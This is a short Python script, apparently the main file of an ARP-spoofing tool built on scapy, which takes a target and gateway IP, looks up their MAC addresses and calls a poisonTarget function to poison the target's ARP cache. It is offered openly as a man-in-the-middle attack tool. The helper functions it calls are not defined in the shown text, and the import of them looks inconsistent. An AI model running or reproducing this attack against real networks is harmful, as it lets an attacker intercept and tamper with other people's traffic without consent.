from scapy.all import *
import os
import optparse
import constants as cons
import utilities

if __name__ == '__main__':

	parser = optparse.OptionParser()
	parser.add_option("-g", "--gateway", dest="gateway")
	parser.add_option("-t", "--target", dest="target")

	(options, arguments) = parser.parse_args()

	if not options.gateway or not options.target:
		print("[-] Usage: python arpspoof.py -t 192.168.1.39 -g 192.168.1.0")
		sys.exit(1)
	else:
		target = options.target
		gateway = options.gateway

	target_mac = getMac(target)
	gateway_mac = getMac(gateway)


	if (target_mac == None or gateway_mac == None):
		print ('Failing getting MAC')
		sys.exit(1)

	print("target MAC: " + target_mac)
	print("gateway MAC: " + gateway_mac)
	poisonTarget(gateway, gateway_mac, target, target_mac)